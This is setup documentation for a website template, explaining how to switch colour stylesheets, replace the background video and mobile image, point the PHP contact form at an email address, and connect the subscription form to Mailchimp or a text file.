    Change Color

    Check <head> part of the index.html. You will find all colors link available. blue color is active. So if you want to use any other color just replace the "blue" with that color name. or you can remove the comment make other color active.

    <!-- COLORS -->

<link rel="stylesheet" href="css/colors/blue.css"> <!-- DEFAULT COLOR/ CURRENTLY USING -->

<!-- <link rel="stylesheet" href="css/colors/red.css"> -->

    Background: Video

    It's very easy to change the background video. 

     

    1.  Just go to the video folder:

    2. You will find the videos in 3 formats. .mp4 .ogg and .webm . And a JPG image. You can convert your videos in this 3 format very easily via http://video.online-convert.com/ . Convert your video int this 3 format and replace the old videos and JPG screenshots. 

    NOTE: If your filename is not "video" and has a dfferent name. You can change it on JS in custom.js file. available on JS folder.

     

    Image background for mobile

    For better performance in mobile. In latest version an image will show in background instead of video on mobile. You can change the background image from css/responsive.css

     

    Currently all devices under 640px width will show the background image instead of video. If you want change this please edit js/custom.js . If you want to use background image instead of video on tablet. use min-width: 768px; also change it on responsive.css (max-width: 640px)

    Contact Form

    Contact form will use php to send emails. So just open sendmail.php file. Change the current email spambox@designlab.co to your email address. Your form is ready.

    (NOTE: Contact form require web server to send email. Emails can go to your spam/junk folder.)
     
     

    Subscription Form

    Default: Mailchimp

    Current active subscribe form will save emails to mail chimp list. 

     

    How to connect mail chimp list? 

    Open custom.js and find following script. Just replace that mailchimp form action url with your mailchimp list url

     

    How to find mailchimp form action URL?

    Just go to your mailchimp account. Then your list. Then Signup forms. Select  Embedded forms. You will find form action URL in this page. 

     

    Option 2: Save emails in text

    This option currently disabled with HTML comment. Just remove the HTML comment you it will be enabled. 

    This Subscription form will save the emails in email-list.txt on subscribe folder

    Email will saved with a comma at the end of every email address. also every email address will be in a new line.
